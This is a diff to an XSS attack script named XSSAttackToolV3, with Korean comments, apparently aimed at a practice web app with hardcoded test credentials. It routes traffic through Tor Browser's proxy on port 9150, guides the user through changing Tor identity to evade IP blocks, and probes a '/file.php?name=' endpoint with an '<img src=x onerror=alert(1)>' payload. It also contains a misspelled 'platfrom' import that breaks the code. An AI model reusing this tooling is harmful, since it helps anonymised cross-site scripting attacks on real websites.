@@ -15,6 +15,7 @@ import base64
 import os
 import sys
 import argparse
+import platfrom
 from urllib.parse import urlparse, parse_qs, urlencode
 import threading
 from colorama import init, Fore, Back, Style
@@ -22,6 +23,7 @@ import socks
 import socket
 from stem import Signal
 from stem.control import Controller
+
 
 # Initialize colorama for colored output
 init(autoreset=True)
@@ -68,12 +70,17 @@ class XSSAttackToolV3:
         """Tor 프록시 설정"""
         try:
             # SOCKS 프록시 설정
-            socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9050)
+            # socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9050)
+            # Tor Browser는 9150 포트 사용 (기존 9050에서 변경)
+            socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9150)  # 9050 → 9150
             socket.socket = socks.socksocket
             
             self.session.proxies = {
-                'http': 'socks5://127.0.0.1:9050',
-                'https': 'socks5://127.0.0.1:9050'
+                # 'http': 'socks5://127.0.0.1:9050',
+                # 'https': 'socks5://127.0.0.1:9050',
+                # Tor Browser는 9150 포트 사용
+                'http': 'socks5://127.0.0.1:9150',
+                'https': 'socks5://127.0.0.1:9150'
             }
             
             # IP 확인
@@ -104,28 +111,26 @@ class XSSAttackToolV3:
         if not self.use_tor:
             print(f"{Fore.YELLOW}[!] Tor is not enabled{Style.RESET_ALL}")
             return
-            
+        
+        # OS별 단축키 안내
+        if platform.system() == 'Darwin':  # macOS
+            shortcut = "Cmd+Shift+L"
+        else:  # Windows/Linux
+            shortcut = "Ctrl+Shift+L"
+        
+        print(f"{Fore.YELLOW}[*] To get new IP in Tor Browser:{Style.RESET_ALL}")
+        print(f"{Fore.CYAN}1. Click on Tor Browser window{Style.RESET_ALL}")
+        print(f"{Fore.CYAN}2. Press {shortcut}{Style.RESET_ALL}")
+        print(f"{Fore.CYAN}3. Or click the onion icon → 'New Identity'{Style.RESET_ALL}")
+        
+        input(f"\n{Fore.YELLOW}Press Enter after getting new identity...{Style.RESET_ALL}")
+        
+        # 새 IP 확인
         try:
-            # 방법 1: Controller 사용 (torrc에 ControlPort 9051 설정 필요)
-            try:
-                with Controller.from_port(port=9051) as controller:
-                    controller.authenticate()
-                    controller.signal(Signal.NEWNYM)
-                    print(f"{Fore.GREEN}[+] New Tor identity requested{Style.RESET_ALL}")
-                    time.sleep(5)
-            except:
-                # 방법 2: Tor 서비스 재시작
-                print(f"{Fore.YELLOW}[*] Trying to restart Tor service...{Style.RESET_ALL}")
-                import subprocess
-                subprocess.run(['brew', 'services', 'restart', 'tor'], capture_output=True)
-                time.sleep(10)
-            
-            # 새 IP 확인
             new_ip = self.session.get('https://api.ipify.org', timeout=10).text
             print(f"{Fore.GREEN}[+] New IP: {new_ip}{Style.RESET_ALL}")
-            
-        except Exception as e:
-            print(f"{Fore.RED}[-] Failed to get new identity: {e}{Style.RESET_ALL}")
+        except:
+            print(f"{Fore.RED}[-] Could not verify new IP{Style.RESET_ALL}")
 
     def make_request(self, url, method='GET', max_retries=3, **kwargs):
         """403 처리가 포함된 공통 요청 함수"""
@@ -186,6 +191,10 @@ class XSSAttackToolV3:
 {Fore.YELLOW}Proxy:{Style.RESET_ALL} {'Port ' + str(self.proxy_port) if self.proxy_port and not self.use_tor else 'N/A'}
 """
         print(banner)
+
+        if self.use_tor:
+            print(f"{Fore.YELLOW}Note: Using Tor Browser on port 9150{Style.RESET_ALL}")
+            print(f"{Fore.CYAN}To change IP: Ctrl+Shift+L in Tor Browser{Style.RESET_ALL}\n")
 
     def login(self, username="bob", password="bobby123"):
         """로그인"""
@@ -292,11 +301,7 @@ class XSSAttackToolV3:
         
         # 일반적인 GET 엔드포인트
         endpoints = [
-            '/search.php?q=',
-            '/profile.php?name=',
-            '/page.php?id=',
-            '/view.php?file=',
-            '/index.php?page='
+            '/file.php?name=',
         ]
         
         test_payload = '<img src=x onerror=alert(1)>'
